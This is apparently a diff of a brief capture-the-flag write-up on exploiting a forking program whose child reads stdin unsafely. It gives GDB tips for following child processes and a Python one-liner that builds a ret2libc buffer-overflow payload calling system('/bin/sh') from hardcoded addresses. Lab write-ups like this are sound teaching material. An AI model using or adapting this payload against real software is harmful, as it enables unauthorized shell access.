@@ -1,2 +1,23 @@
-output of running executable is give shell code
+Output of running executable is give shell code
+
+# Breakdown
+
+There are two processes: a parent process that waits for a child to finish, and a child one that
+dangerously reads from stdin and returns.
+
+# Tips
+
+`set detach-on-fork off` in GDB to keep attached to both processes
+
+`info inferiors` to see all process running
+
+`catch fork` and then `ni` to find the moment where the child process is created
+
+`inferior 2` to switch to another process/thread
+
+# Creating the payload
+
+`[156 bytes of padding] [address of system()] [return pointer for system (address of exit)] [addr of "/bin/sh" as an argument]`
+
+`python -c "import struct;print('a'*156 + struct.pack('I', 0xf7e6aed0)+ struct.pack('I', 0xf7e5eb70) + struct.pack('I', 0xf7f897ec))" > /tmp/e1`
 
